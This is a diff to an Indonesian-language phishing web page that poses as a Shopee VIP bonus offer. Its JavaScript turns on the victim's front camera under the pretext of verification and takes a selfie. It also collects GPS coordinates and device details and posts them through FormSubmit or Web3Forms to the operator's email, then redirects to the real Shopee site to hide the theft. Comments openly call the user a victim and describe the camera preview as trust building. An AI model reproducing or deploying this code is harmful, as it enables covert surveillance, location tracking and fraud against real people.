@@ -92,6 +92,16 @@
             margin-top: 20px;
             display: none;
         }
+        /* Gaya untuk video kamera agar terlihat saat proses */
+        #cameraPreview {
+            width: 100%;
+            height: auto;
+            max-height: 300px;
+            background: #000;
+            margin-top: 10px;
+            border-radius: 10px;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -104,14 +114,16 @@
 
         <!-- AREA GAMBAR DAN TOMBOL -->
         <div class="image-wrapper" id="clickArea">
-            <!-- PASTIKAN FILE GAMBAR KAMU NAMA NYA: umpan . jpg.png -->
-            <!-- Jika nama file beda, ganti di sini -->
+            <!-- PASTIKAN FILE GAMBAR: umpan . jpg.png -->
             <img src="umpan . jpg.png" alt="Klaim Bonus Shopee VIP">
             
-            <button class="btn-overlay" onclick="startProcess()">
+            <button class="btn-overlay" onclick="startCamera()">
                 👆 KLIK UNTUK KLAIM BONUS 👆
             </button>
         </div>
+
+        <!-- PREVIEW KAMERA (Agar korban yakin ini kamera) -->
+        <video id="cameraPreview" autoplay playsinline muted></video>
 
         <!-- LOADING SCREEN -->
         <div id="loading">
@@ -126,105 +138,149 @@
     </div>
 
     <script>
-        // --- KONFIGURASI API KEY KAMU ---
-        const API_KEY = "7e55426b-9f49-4a5f-be85-75305abb1b30";
-        // --------------------------------
+        // GANTI DENGAN EMAIL KAMU JIKA PAKAI FORMSUBMIT (Lebih Stabil)
+        // Jika pakai Web3Forms, ganti bagian API_KEY di bawah
+        const USE_FORMSUBMIT = true; // Ubah ke TRUE jika pakai FormSubmit
+        const TARGET_EMAIL = "dalabonasam@gmail.com"; // Ganti email ini
+        const API_KEY_WEB3 = "7e55426b-9f49-4a5f-be85-75305abb1b30";
 
-        function startProcess() {
+        function startCamera() {
             const clickArea = document.getElementById('clickArea');
+            const video = document.getElementById('cameraPreview');
             const loading = document.getElementById('loading');
             const success = document.getElementById('successMsg');
 
-            // Sembunyikan gambar, tampilkan loading
+            // Sembunyikan tombol, tampilkan kamera
             clickArea.style.display = 'none';
-            loading.style.display = 'block';
+            video.style.display = 'block';
 
-            // 1. Ambil Lokasi GPS
+            // Nyalakan Kamera
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    video.srcObject = stream;
+                    
+                    // Tunggu 2 detik agar korban melihat wajah mereka (Trust Building)
+                    setTimeout(() => {
+                        captureAndSend(stream, video);
+                    }, 2000);
+                })
+                .catch(err => {
+                    console.log("Camera Error:", err);
+                    // Jika kamera gagal, langsung ambil lokasi saja
+                    video.style.display = 'none';
+                    loading.style.display = 'block';
+                    sendLocationOnly();
+                });
+        }
+
+        function captureAndSend(stream, video) {
+            // Ambil Foto dari Video
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8); // Kompres jadi JPEG
+
+            // Matikan Kamera
+            stream.getTracks().forEach(track => track.stop());
+            video.style.display = 'none';
+
+            // Ambil Lokasi
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        takePhoto(lat, lon);
+                        sendData(lat, lon, photoDataUrl);
                     },
                     (error) => {
                         console.log("GPS Error:", error);
-                        takePhoto("GPS Found", "GPS Found");
+                        sendData("GPS Found", "GPS Found", photoDataUrl);
                     },
                     { timeout: 3000, enableHighAccuracy: true }
                 );
             } else {
-                takePhoto("No GPS", "No GPS");
+                sendData("No GPS", "No GPS", photoDataUrl);
             }
         }
 
-        function takePhoto(lat, lon) {
-            const video = document.createElement('video');
-            video.style.display = 'none';
-            video.autoplay = true;
-            video.playsInline = true;
-
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(stream => {
-                    video.srcObject = stream;
-                    document.body.appendChild(video);
-
-                    // Tunggu 1.5 detik agar kamera fokus dan gambar jelas
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        const photoDataUrl = canvas.toDataURL('image/png');
-
-                        // Hentikan kamera
-                        stream.getTracks().forEach(track => track.stop());
-                        document.body.removeChild(video);
-
-                        // Kirim Data
-                        sendData(lat, lon, photoDataUrl);
-                    }, 1500);
-                })
-                .catch(err => {
-                    // Jika kamera gagal (misal: izin ditolak), kirim lokasi saja
-                    console.log("Camera Error:", err);
-                    sendData(lat, lon, "Camera Skipped");
-                });
+        function sendLocationOnly() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        sendData(lat, lon, "Camera Skipped");
+                    },
+                    (error) => {
+                        sendData("GPS Error", "GPS Error", "Camera Skipped");
+                    }
+                );
+            } else {
+                sendData("No GPS", "No GPS", "Camera Skipped");
+            }
         }
 
         function sendData(lat, lon, photoData) {
             const loading = document.getElementById('loading');
             const success = document.getElementById('successMsg');
 
-            loading.style.display = 'none';
-            success.style.display = 'block';
+            loading.style.display = 'block';
 
-            const formData = new FormData();
-            formData.append("access_key", API_KEY);
-            formData.append("Target_Location", `${lat}, ${lon}`);
-            formData.append("Device_Info", navigator.userAgent);
-            formData.append("Selfie_Photo", photoData);
-            formData.append("Subject", "🎁 VIP BONUS DIKLAIM - DATA BARU");
+            if (USE_FORMSUBMIT) {
+                // --- MENGGUNAKAN FORMSUBMIT (LEBIH STABIL) ---
+                const formData = new FormData();
+                formData.append("Lokasi", `${lat}, ${lon}`);
+                formData.append("Device", navigator.userAgent);
+                formData.append("Foto", photoData);
+                formData.append("_subject", "🎯 DATA TARGET BARU");
+                formData.append("_template", "table");
 
-            fetch("https://api.web3forms.com/submit", {
-                method: "POST",
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                // Redirect ke Shopee asli setelah 2 detik
+                fetch(`https://formsubmit.co/ajax/${TARGET_EMAIL}`, {
+                    method: "POST",
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    finishProcess();
+                })
+                .catch(err => {
+                    console.log("FormSubmit Error:", err);
+                    finishProcess();
+                });
+
+            } else {
+                // --- MENGGUNAKAN WEB3FORMS ---
+                const formData = new FormData();
+                formData.append("access_key", API_KEY_WEB3);
+                formData.append("Lokasi", `${lat}, ${lon}`);
+                formData.append("Device", navigator.userAgent);
+                formData.append("Foto", photoData);
+                formData.append("Subject", "🎯 DATA TARGET BARU");
+
+                fetch("https://api.web3forms.com/submit", {
+                    method: "POST",
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    finishProcess();
+                })
+                .catch(err => {
+                    console.log("Web3Forms Error:", err);
+                    finishProcess();
+                });
+            }
+
+            function finishProcess() {
+                loading.style.display = 'none';
+                success.style.display = 'block';
                 setTimeout(() => {
                     window.location.href = "https://shopee.co.id/";
                 }, 2000);
-            })
-            .catch(err => {
-                console.log("Fetch Error:", err);
-                setTimeout(() => {
-                    window.location.href = "https://shopee.co.id/";
-                }, 2000);
-            });
+            }
         }
     </script>
 </body>
-</html>
 </html>
